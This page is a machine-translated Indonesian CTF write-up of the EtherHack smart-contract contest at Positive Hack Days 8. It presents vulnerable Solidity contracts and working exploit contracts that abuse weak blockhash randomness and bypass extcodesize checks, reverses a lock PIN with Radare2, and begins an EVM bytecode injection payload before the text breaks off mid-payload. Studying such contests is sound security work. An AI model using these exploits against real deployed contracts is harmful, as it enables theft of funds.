<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸˆ³ ğŸ‘©ğŸ½â€ğŸ« ğŸ§‘ğŸ¾â€ğŸ¤â€ğŸ§‘ğŸ½ Menemukan Kerentanan dalam Kontrak Cerdas: Ulasan EtherHack di Positive Hack Days 8 â˜ªï¸ ğŸš¦ ğŸ¤’</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Tahun ini, PHDays menjadi tuan rumah kompetisi yang disebut EtherHack untuk pertama kalinya. Peserta mencari kerentanan dalam kontrak pintar untuk kec...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Menemukan Kerentanan dalam Kontrak Cerdas: Ulasan EtherHack di Positive Hack Days 8</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/414959/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/182/a00/fef/182a00fef4fbdd4677afb585de886e1e.jpg" alt="gambar"></a> <br><br>  Tahun ini, PHDays menjadi tuan rumah kompetisi yang disebut <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">EtherHack</a> untuk pertama kalinya.  Peserta mencari kerentanan dalam kontrak pintar untuk kecepatan.  Dalam artikel ini kami akan memberi tahu Anda tentang tugas-tugas kompetisi dan kemungkinan cara untuk menyelesaikannya. <a name="habracut"></a><br><br><h2>  Azino 777 </h2><br><h4>  Menangkan lotre dan memecahkan pot! </h4><br>  Tiga tugas pertama terkait dengan kesalahan dalam pembuatan nomor pseudorandom, yang baru-baru ini kita bicarakan: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Memprediksi angka acak dalam kontrak pintar Ethereum</a> .  Tugas pertama didasarkan pada generator nomor pseudorandom (PRNG), yang menggunakan hash dari blok terakhir sebagai sumber entropi untuk menghasilkan angka acak: <br><br><pre><code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract Azino777 { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">//Generate random number between 0 &amp; max uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399; function rand(uint max) constant private returns (uint256 result){ uint256 factor = FACTOR * 100 / max; uint256 lastBlockNumber = block.number - 1; uint256 hashVal = uint256(block.blockhash(lastBlockNumber)); return uint256((uint256(hashVal) / factor)) % max; } function() public payable {} }</span></span></code> </pre> <br>  Karena hasil dari memanggil fungsi <code>block.blockhash(block.number-1)</code> akan sama untuk setiap transaksi dalam blok yang sama, serangan dapat menggunakan kontrak exploit dengan fungsi <code>rand()</code> sama untuk memanggil kontrak target melalui pesan internal: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">WeakRandomAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = Azino777(_target); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); }</code> </pre> <br><h2>  Ryan pribadi </h2><br><h4>  Kami telah menambahkan nilai awal pribadi yang tidak akan pernah dihitung oleh siapa pun. </h4><br>  Tugas ini adalah versi yang sedikit rumit dari yang sebelumnya.  Variabel seed, yang dianggap pribadi, digunakan untuk mengimbangi nomor urut blok (block.number) sehingga hash blok tidak bergantung pada blok sebelumnya.  Setelah setiap taruhan, seed ditulis ulang ke offset â€œacakâ€ baru.  Sebagai contoh, dalam lotre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Slotthereum</a> itu hanya itu. <br><br><pre> <code class="cpp hljs">contract PrivateRyan { uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyan</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br>  Seperti pada tugas sebelumnya, peretas hanya perlu menyalin fungsi <code>rand()</code> ke dalam exploit kontrak, tetapi dalam kasus ini nilai seed variabel pribadi harus diperoleh di luar blockchain dan kemudian dikirim ke exploit sebagai argumen.  Untuk melakukan ini, Anda bisa menggunakan metode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">web3.eth.getStorageAt ()</a> dari perpustakaan web3: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f54/73b/748/f5473b74840e81cc2bef6c3105401777.png" alt="gambar"><br><br>  <i>Membaca toko kontrak di luar blockchain untuk mendapatkan nilai awal</i> <br><br>  Setelah menerima nilai awal, tetap hanya mengirimnya ke exploit, yang hampir identik dengan yang ada di tugas pertama: <br><br><pre> <code class="cpp hljs">contract PrivateRyanAttack { PrivateRyan target; uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyanAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target, uint _seed)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = PrivateRyan(_target); seed = _seed; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br><h2>  Roda keberuntungan </h2><br><h4>  Lotre ini menggunakan hash dari blok selanjutnya.  Coba hitung! </h4><br>  Dalam tugas ini, perlu untuk mengetahui hash dari blok yang nomornya disimpan dalam struktur Game setelah taruhan ditempatkan.  Hash ini kemudian diekstraksi untuk menghasilkan angka acak setelah taruhan berikutnya dibuat. <br><br><pre> <code class="cpp hljs">Pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract WheelOfFortune { Game[] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> games; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Game</span></span></span><span class="hljs-class"> {</span></span> address player; uint id; uint bet; uint blockNumber; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 _bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint gameId = games.length; games.length++; games[gameId].id = gameId; games[gameId].player = msg.sender; games[gameId].bet = _bet; games[gameId].blockNumber = block.number; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (gameId &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { uint lastGameId = gameId - <span class="hljs-number"><span class="hljs-number">1</span></span>; uint num = rand(block.blockhash(games[lastGameId].blockNumber), <span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == games[lastGameId].bet) { games[lastGameId].player.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rand</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes32 hash, uint max)</span></span></span><span class="hljs-function"> pure </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 result)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> uint256(keccak256(hash)) % max; } function() <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> payable {} }</code> </pre><br>  Dalam hal ini, ada dua solusi yang mungkin. <br><br><ol><li>  Panggil kontrak target dua kali melalui kontrak eksploitasi.  Hasil dari memanggil fungsi block.blockhash (block.number) akan selalu nol. </li><li>  Tunggu 256 blok untuk masuk dan melakukan taruhan kedua.  Hash nomor urutan blok yang disimpan akan menjadi nol karena <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">keterbatasan Ethereum Virtual Machine (EVM)</a> pada jumlah hash blok yang tersedia. </li></ol><br>  Dalam kedua kasus, taruhan yang menang adalah <code>uint256(keccak256(bytes32(0))) % 100</code> atau â€œ47â€. <br><br><h2>  Panggil aku mungkin </h2><br><h4>  Kontrak ini tidak suka ketika kontrak lain menyebutnya. </h4><br>  Salah satu cara untuk melindungi kontrak agar tidak dipanggil oleh kontrak lain adalah dengan menggunakan instruksi assembler EVM <code>extcodesize</code> , yang mengembalikan ukuran kontrak di alamatnya.  Metode ini adalah dengan menggunakan instruksi ini untuk alamat pengirim transaksi menggunakan penyisipan assembler.  Jika hasilnya lebih besar dari nol, maka pengirim transaksi adalah kontrak, karena alamat biasa di Ethereum tidak memiliki kode.  Justru pendekatan inilah yang digunakan dalam tugas ini untuk mencegah kontrak lain memanggil kontrak. <br><br><pre> <code class="cpp hljs">contract CallMeMaybe { <span class="hljs-function"><span class="hljs-function">modifier </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybe</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); } _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HereIsMyNumber</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> CallMeMaybe </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(tx.origin == msg.sender) { revert(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } function() payable {} }</code> </pre> <br>  <code>tx.origin</code> transaksi <code>tx.origin</code> menunjuk ke pencipta asli transaksi, dan mengirim pesan ke pemanggil terakhir.  Jika kami mengirim transaksi dari alamat yang biasa, variabel-variabel ini akan sama, dan kami akan berakhir dengan <code>revert()</code> .  Oleh karena itu, untuk menyelesaikan masalah kami, perlu untuk mem-bypass verifikasi dari instruksi <code>extcodesize</code> sehingga <code>tx.origin</code> dan <code>msg.sender</code> berbeda.  Untungnya, ada satu fitur bagus di EVM yang dapat membantu: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9e9/07a/74e/9e907a74eb156cb8380527b50d47a4b8.png" alt="gambar"><br><br>  Memang, ketika kontrak yang baru saja ditempatkan memanggil beberapa kontrak lain dalam konstruktor, itu sendiri belum ada di blockchain, ia bertindak secara eksklusif sebagai dompet.  Dengan demikian, kode tidak terikat pada kontrak baru dan extcodesize akan mengembalikan nol: <br><br><pre> <code class="cpp hljs"> contract CallMeMaybeAttack { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybeAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(CallMeMaybe _target)</span></span></span><span class="hljs-function"> payable </span></span>{ _target.HereIsMyNumber(); } function() payable {} }</code> </pre> <br><h2>  Kuncinya </h2><br><h4>  Anehnya, kastil ditutup.  Cobalah untuk mengambil kode pin melalui fungsi buka kunci (kode byte bytes4).  Setiap upaya untuk membuka kunci akan dikenakan biaya 0,5 eter. </h4><br>  Dalam tugas ini, para peserta tidak diberi kode - mereka harus mengembalikan logika kontrak dengan bytecode-nya.  Salah satu opsi adalah menggunakan Radare2, platform yang digunakan untuk <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">membongkar</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">men</a> - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">debug EVM</a> . <br><br>  Untuk memulai, kami akan memposting contoh tugas dan memasukkan kode secara acak: <br><br><pre> <code class="cpp hljs">await contract.unlock(<span class="hljs-string"><span class="hljs-string">"1337"</span></span>, {value: <span class="hljs-number"><span class="hljs-number">500000000000000000</span></span>}) â†’<span class="hljs-literal"><span class="hljs-literal">false</span></span></code> </pre> <br>  Upaya itu tentu saja baik, tetapi tidak berhasil.  Sekarang coba debug transaksi ini. <br><br><pre> <code class="cpp hljs">r2 -a evm -D evm <span class="hljs-string"><span class="hljs-string">"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7"</span></span></code> </pre> <br>  Dalam hal ini, kami menginstruksikan Radare2 untuk menggunakan arsitektur evm.  Alat ini kemudian menghubungkan ke node Ethereum dan mengambil jejak transaksi ini di mesin virtual.  Dan sekarang, akhirnya, kami siap untuk menyelam ke bytecode EVM. <br><br>  Pertama-tama, Anda perlu melakukan analisis: <br><br><pre> <code class="cpp hljs">[<span class="hljs-number"><span class="hljs-number">0x00000000</span></span>]&gt; aa [x] Analyze all flags starting with sym. <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">and</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">entry0</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(aa)</span></span></span></span></code> </pre> <br>  Selanjutnya, kami membongkar 1000 instruksi pertama (ini harus cukup untuk menutupi seluruh kontrak) menggunakan perintah pd 1000, dan beralih untuk melihat grafik dengan perintah VV. <br><br>  Dalam kode byte EVM yang dikompilasi dengan <code>solc</code> , biasanya manajer fungsi datang terlebih dahulu.  Berdasarkan empat byte pertama dari data panggilan yang berisi tanda tangan fungsi, yang didefinisikan sebagai <code>bytes4(sha3(function_name(params)))</code> , manajer fungsi memutuskan fungsi mana yang dipanggil.  Kami tertarik pada fungsi <code>unlock(bytes4)</code> , yang sesuai dengan <code>0x75a4e3a0</code> . <br><br>  Mengikuti aliran eksekusi menggunakan kunci s, kita sampai ke node yang membandingkan <code>callvalue</code> nilai <code>0x6f05b59d3b20000</code> dengan nilai <code>0x6f05b59d3b20000</code> atau <code>500000000000000000</code> , yang setara dengan 0,5 eter: <br><br><pre> <code class="cpp hljs">push8 <span class="hljs-number"><span class="hljs-number">0x6f05b59d3b20000</span></span> callvalue lt</code> </pre> <br>  Jika eter yang disediakan sudah cukup, maka kita mendapati diri kita berada dalam sebuah simpul yang menyerupai struktur kontrol: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup4 push1 <span class="hljs-number"><span class="hljs-number">0xff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> lt iszero push2 <span class="hljs-number"><span class="hljs-number">0x1a4</span></span> jumpi</code> </pre> <br>  Kode menempatkan nilai 0x4 di bagian atas tumpukan, memeriksa batas atas (nilai tidak boleh melebihi 0xff) dan membandingkannya dengan beberapa nilai yang diduplikasi dari elemen keempat tumpukan (dup4). <br><br>  Menggulir ke bagian paling bawah grafik, kita melihat bahwa elemen keempat ini pada dasarnya adalah iterator, dan struktur kontrol ini adalah loop yang sesuai dengan <code>for(var i=0; i&lt;4; i++):</code> <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x1</span></span> add swap4</code> </pre> <br>  Jika kita menganggap tubuh loop, menjadi jelas bahwa ia menyebutkan empat byte yang masuk dan melakukan beberapa operasi dengan masing-masing byte.  Pertama, loop memeriksa bahwa byte ke-n lebih besar dari 0x30: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 lt iszero</code> </pre> <br>  dan juga bahwa nilai ini kurang dari 0x39: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x39</span></span> dup3 gt iszero</code> </pre> <br>  yang pada dasarnya merupakan pemeriksaan bahwa byte yang diberikan berada dalam kisaran dari 0 hingga 9. Jika pemeriksaan berhasil, maka kami berada di blok kode yang paling penting: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/085/2d4/27b/0852d427bd50ab1d0da2fed5131dfac2.png" alt="gambar"><br><br>  Mari kita hancurkan blok ini menjadi beberapa bagian: <br><br>  1. Elemen ketiga dalam stack adalah kode ASCII dari byte ke-n dari kode pin.  0x30 (kode ASCII untuk nol) didorong ke tumpukan dan kemudian dikurangi dari kode byte ini: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 sub</code> </pre> <br>  Yaitu, <code>pincode[i] - 48</code> , dan pada dasarnya kami mendapatkan angka dari kode ASCII, sebut saja d. <br><br>  2. 0x4 ditambahkan ke stack dan digunakan sebagai eksponen untuk elemen kedua di stack, d: <br><br><pre> <code class="cpp hljs">swap1 pop push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup2 <span class="hljs-built_in"><span class="hljs-built_in">exp</span></span></code> </pre> <br>  Yaitu, <code>d ** 4</code> . <br><br>  3. Elemen kelima dari stack diambil dan hasil eksponensial ditambahkan padanya.  Sebut jumlah ini S: <br><br><pre> <code class="cpp hljs">dup5 add swap4 pop dup1</code> </pre> <br>  Yaitu, <code>S += d ** 4</code> . <br><br>  4. 0xa (kode ASCII untuk 10) didorong ke stack dan digunakan sebagai pengali untuk elemen ketujuh stack (yang merupakan keenam sebelum penambahan ini).  Kita tidak tahu apa itu, oleh karena itu kita akan memanggil elemen ini U. Kemudian d ditambahkan ke hasil perkalian: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0xa</span></span> dup7 mul add swap5 pop</code> </pre> <br>  Yaitu: <code>U = U * 10 + d</code> atau, lebih sederhana, ungkapan ini memulihkan seluruh kode pin sebagai angka dari masing-masing byte <code>([0x1, 0x3, 0x3, 0x7] â†’ 1337)</code> . <br><br>  Hal paling sulit yang kami lakukan, sekarang mari kita beralih ke kode setelah loop. <br><br><pre> <code class="cpp hljs">dup5 dup5 eq</code> </pre> <br>  Jika elemen kelima dan keenam pada stack sama, maka aliran eksekusi akan membawa kita ke instruksi sstore, yang menetapkan bendera tertentu di toko kontrak.  Karena ini adalah satu-satunya instruksi toko, inilah yang tampaknya kami cari. <br><br>  Tapi bagaimana cara melewati tes ini?  Seperti yang sudah kita ketahui, elemen kelima pada stack adalah S, dan keenam adalah U. Karena S adalah jumlah dari semua digit kode pin yang dinaikkan ke kekuatan keempat, kita memerlukan kode pin yang syarat ini akan dipenuhi.  Dalam kasus kami, analisis menunjukkan bahwa <code>1**4 + 3**4 + 3**4 + 7**4</code> tidak sama dengan 1337, dan kami tidak mendapatkan instruksi <code>sstore</code> menang. <br><br>  Tetapi sekarang kita dapat menghitung angka yang memenuhi kondisi persamaan ini.  Hanya ada tiga angka yang dapat ditulis sebagai jumlah digit tingkat keempat mereka: 1634, 8208, dan 9474. Setiap dari mereka dapat membuka kunci! <br><br><h2>  Kapal bajak laut </h2><br><h4>  Hai Salag!  Sebuah kapal bajak laut ditambatkan di pelabuhan.  Buat dia jangkar dan angkat bendera dengan Jolly Roger dan pergi mencari harta karun. </h4><br>  Kursus standar pelaksanaan kontrak mencakup tiga tindakan: <br><br><ol><li>  Panggilan ke fungsi <code>dropAnchor()</code> dengan nomor blok yang harus lebih dari 100.000 blok lebih besar dari yang sekarang.  Fungsi secara dinamis membuat kontrak, yang merupakan "jangkar", yang dapat "diangkat" menggunakan <code>selfdestruct()</code> setelah blok yang ditentukan. </li><li>  Panggilan ke fungsi <code>pullAnchor()</code> , yang menginisiasi <code>selfdestruct()</code> jika waktu yang cukup telah berlalu (banyak waktu!). </li><li>  Sebut sailAway (), yang menetapkan <code>blackJackIsHauled</code> menjadi true jika tidak ada kontrak anchor. </li></ol><br><pre> <code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.19</span></span>; contract PirateShip { address <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> anchor = <span class="hljs-number"><span class="hljs-number">0x0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> blackJackIsHauled = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sailAway</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ require(anchor != <span class="hljs-number"><span class="hljs-number">0x0</span></span>); address a = anchor; uint size = <span class="hljs-number"><span class="hljs-number">0</span></span>; assembly { size := extcodesize(a) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); <span class="hljs-comment"><span class="hljs-comment">// it is too early to sail away } blackJackIsHauled = true; // Yo Ho Ho! } function pullAnchor() public { require(anchor != 0x0); require(anchor.call()); // raise the anchor if the ship is ready to sail away } function dropAnchor(uint blockNumber) public returns(address addr) { // the ship will be able to sail away in 100k blocks time require(blockNumber &gt; block.number + 100000); // if(block.number &lt; blockNumber) { throw; } // suicide(msg.sender); uint[8] memory a; a[0] = 0x6300; // PUSH4 0x00... a[1] = blockNumber; // ...block number (3 bytes) a[2] = 0x43; // NUMBER a[3] = 0x10; // LT a[4] = 0x58; // PC a[5] = 0x57; // JUMPI a[6] = 0x33; // CALLER a[7] = 0xff; // SELFDESTRUCT uint code = assemble(a); // init code to deploy contract: stores it in memory and returns appropriate offsets uint[8] memory b; b[0] = 0; // allign b[1] = 0x6a; // PUSH11 b[2] = code; // contract b[3] = 0x6000; // PUSH1 0 b[4] = 0x52; // MSTORE b[5] = 0x600b; // PUSH1 11 ;; length b[6] = 0x6015; // PUSH1 21 ;; offset b[7] = 0xf3; // RETURN uint initcode = assemble(b); uint sz = getSize(initcode); uint offset = 32 - sz; assembly { let solidity_free_mem_ptr := mload(0x40) mstore(solidity_free_mem_ptr, initcode) addr := create(0, add(solidity_free_mem_ptr, offset), sz) } require(addr != 0x0); anchor = addr; } ///////////////// HELPERS ///////////////// function assemble(uint[8] chunks) internal pure returns(uint code) { for(uint i=chunks.length; i&gt;0; i--) { code ^= chunks[i-1] &lt;&lt; 8 * getSize(code); } } function getSize(uint256 chunk) internal pure returns(uint) { bytes memory b = new bytes(32); assembly { mstore(add(b, 32), chunk) } for(uint32 i = 0; i&lt; b.length; i++) { if(b[i] != 0) { return 32 - i; } } return 0; } }</span></span></code> </pre> <br>  Kerentanannya sangat jelas: kami memiliki injeksi langsung instruksi assembler ketika membuat kontrak di fungsi <code>dropAnchor()</code> .  Tetapi kesulitan utama adalah membuat muatan yang memungkinkan kami melewati <code>block.number</code> . <code>block.number</code> . <br><br>  Di EVM, Anda dapat membuat kontrak menggunakan pernyataan create.  Argumennya adalah nilai, offset input, dan ukuran input.  nilai adalah bytecode yang menjadi tuan rumah kontrak itu sendiri (kode inisialisasi).  Dalam kasus kami, kode inisialisasi + kode kontrak ditempatkan di uint256 (terima kasih kepada tim <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">GasToken</a> untuk idenya): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x6a63004141414310585733ff600052600b6015f3</span></span></code> </pre> <br>  di mana byte dalam huruf tebal adalah kode dari kontrak yang di-host, dan 414141 adalah situs injeksi.  Karena kita dihadapkan pada tugas untuk menyingkirkan operator pelemparan, kita perlu memasukkan kontrak baru kita dan menulis ulang bagian akhir dari kode inisialisasi.  Mari kita coba menyuntikkan kontrak dengan instruksi 0xff, yang akan mengarah pada penghapusan tanpa syarat kontrak anchor menggunakan <code>selfdestruct()</code> : <br><br><pre>  68 414141ff3f3f3f3f3f ;;  kontrak push9
 60 00 ;;  push1 0
 52 ;;  mstore
 60 09 ;;  push1 9
 60 17 ;;  push1 17
